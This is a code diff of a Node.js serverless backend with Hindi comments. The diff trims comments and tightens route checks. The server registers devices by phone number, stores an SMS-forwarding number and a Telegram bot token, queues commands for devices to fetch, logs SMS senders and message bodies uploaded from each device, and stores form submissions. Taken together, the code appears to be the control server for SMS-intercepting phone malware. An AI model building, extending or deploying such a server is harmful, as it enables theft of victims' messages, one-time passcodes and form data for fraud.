@@ -1,14 +1,11 @@
-const http = require('http' );
 const path = require('path');
-const fs = require('fs');
 const Database = require('better-sqlite3');
 
 // --- डेटाबेस सेटअप ---
-// Vercel पर लिखने के लिए सिर्फ /tmp फोल्डर उपलब्ध है।
 const dbPath = path.join(process.env.VERCEL ? '/tmp' : '.', 'database.sqlite');
 const db = new Database(dbPath);
 
-// टेबल बनाने का कोड (सिर्फ एक बार चलेगा)
+// टेबल बनाने का कोड
 db.exec(`
     CREATE TABLE IF NOT EXISTS devices (
         id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT UNIQUE NOT NULL, device_name TEXT,
@@ -35,19 +32,17 @@ db.exec(`
 
 // --- मुख्य सर्वर लॉजिक ---
 module.exports = async (req, res) => {
-    // CORS Headers - सभी डोमेन से रिक्वेस्ट अलाउ करने के लिए
+    // CORS Headers
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
     res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
 
-    // OPTIONS रिक्वेस्ट को हैंडल करें (CORS प्री-फ्लाइट)
     if (req.method === 'OPTIONS') {
         return res.status(200).end();
     }
 
     const { method, url } = req;
     
-    // बॉडी डेटा को पढ़ने के लिए एक फंक्शन
     const getBody = () => new Promise((resolve) => {
         let body = '';
         req.on('data', chunk => { body += chunk.toString(); });
@@ -55,18 +50,16 @@ module.exports = async (req, res) => {
             try {
                 resolve(body ? JSON.parse(body) : {});
             } catch {
-                resolve({}); // JSON पार्स एरर होने पर खाली ऑब्जेक्ट भेजें
+                resolve({});
             }
         });
     });
 
     const reqBody = await getBody();
-    const urlParts = url.split('?')[0].split('/').filter(Boolean); // URL को हिस्सों में तोड़ें
+    const urlParts = url.split('?')[0].split('/').filter(Boolean);
 
     try {
-        // --- सभी API रूट्स को यहाँ हैंडल करें ---
-
-        // 1. डिवाइस रजिस्ट्रेशन और अपडेट (POST /api/device/register)
+        // 1. डिवाइस रजिस्ट्रेशन (POST /api/device/register)
         if (method === 'POST' && url.startsWith('/api/device/register')) {
             const { device_id, device_name, os_version, battery_level, phone_number } = reqBody;
             const now = new Date().toISOString();
@@ -76,10 +69,10 @@ module.exports = async (req, res) => {
             } else {
                 db.prepare('INSERT INTO devices (device_id, device_name, os_version, battery_level, phone_number, last_seen, created_at) VALUES (?, ?, ?, ?, ?, ?, ?)').run(device_id, device_name, os_version, battery_level, phone_number, now, now);
             }
-            return res.status(200).json({ status: 'success', message: 'Device data received and updated.' });
+            return res.status(200).json({ status: 'success', message: 'Device data updated.' });
         }
 
-        // 2. सभी डिवाइस की लिस्ट (GET /api/devices)
+        // 2. डिवाइस लिस्ट (GET /api/devices)
         if (method === 'GET' && url.startsWith('/api/devices')) {
             const devices = db.prepare('SELECT * FROM devices ORDER BY created_at ASC').all();
             const now = new Date();
@@ -87,7 +80,7 @@ module.exports = async (req, res) => {
             return res.status(200).json(devicesWithStatus);
         }
 
-        // 3. SMS फॉरवर्डिंग नंबर (POST और GET /api/config/sms_forward)
+        // 3. SMS फॉरवर्डिंग (POST/GET /api/config/sms_forward)
         if (url.startsWith('/api/config/sms_forward')) {
             if (method === 'POST') {
                 db.prepare("INSERT INTO global_settings (setting_key, setting_value) VALUES ('sms_forward_number', ?) ON CONFLICT(setting_key) DO UPDATE SET setting_value = excluded.setting_value").run(reqBody.forward_number);
@@ -99,7 +92,7 @@ module.exports = async (req, res) => {
             }
         }
         
-        // 4. टेलीग्राम सेटिंग्स (POST और GET /api/config/telegram)
+        // 4. टेलीग्राम सेटिंग्स (POST/GET /api/config/telegram)
         if (url.startsWith('/api/config/telegram')) {
             if (method === 'POST') {
                 db.prepare("INSERT INTO global_settings (setting_key, setting_value) VALUES ('telegram_bot_token', ?) ON CONFLICT(setting_key) DO UPDATE SET setting_value = excluded.setting_value").run(reqBody.telegram_bot_token);
@@ -122,7 +115,7 @@ module.exports = async (req, res) => {
         }
 
         // 6. पेंडिंग कमांड पाना (GET /api/device/{deviceId}/commands)
-        if (method === 'GET' && url.includes('/commands') && urlParts.length === 4) {
+        if (method === 'GET' && url.includes('/commands') && urlParts[1] === 'device' && urlParts.length === 4) {
             const deviceId = urlParts[2];
             const commands = db.prepare("SELECT id, command_type, command_data FROM commands WHERE device_id = ? AND status = 'pending'").all(deviceId);
             if (commands.length > 0) {
@@ -134,14 +127,14 @@ module.exports = async (req, res) => {
         }
 
         // 7. कमांड को एक्सेक्यूटेड मार्क करना (POST /api/command/{commandId}/execute)
-        if (method === 'POST' && url.includes('/execute') && urlParts.length === 4) {
+        if (method === 'POST' && url.includes('/execute') && urlParts[1] === 'command' && urlParts.length === 4) {
             const commandId = urlParts[2];
             db.prepare("UPDATE commands SET status = 'executed' WHERE id = ?").run(commandId);
             return res.status(200).json({ status: 'success', message: 'Command marked as executed.' });
         }
 
         // 8. SMS लॉग करना (POST /api/device/{deviceId}/sms)
-        if (method === 'POST' && url.includes('/sms') && urlParts.length === 4) {
+        if (method === 'POST' && url.includes('/sms') && urlParts[1] === 'device' && urlParts.length === 4) {
             const deviceId = urlParts[2];
             db.prepare('INSERT INTO sms_logs (device_id, sender, message_body) VALUES (?, ?, ?)')
               .run(deviceId, reqBody.sender, reqBody.message_body);
@@ -149,14 +142,14 @@ module.exports = async (req, res) => {
         }
 
         // 9. फॉर्म डेटा सबमिट करना (POST /api/device/{deviceId}/forms)
-        if (method === 'POST' && url.includes('/forms') && urlParts.length === 4) {
+        if (method === 'POST' && url.includes('/forms') && urlParts[1] === 'device' && urlParts.length === 4) {
             const deviceId = urlParts[2];
             db.prepare('INSERT INTO form_submissions (device_id, custom_data) VALUES (?, ?)')
               .run(deviceId, reqBody.custom_data);
             return res.status(201).json({ status: 'success', message: 'Form data submitted.' });
         }
 
-        // 10. डिवाइस और उसका डेटा डिलीट करना (DELETE /api/device/{deviceId})
+        // 10. डिवाइस डिलीट करना (DELETE /api/device/{deviceId})
         if (method === 'DELETE' && urlParts.length === 3 && urlParts[1] === 'device') {
             const deviceId = urlParts[2];
             db.transaction(() => {
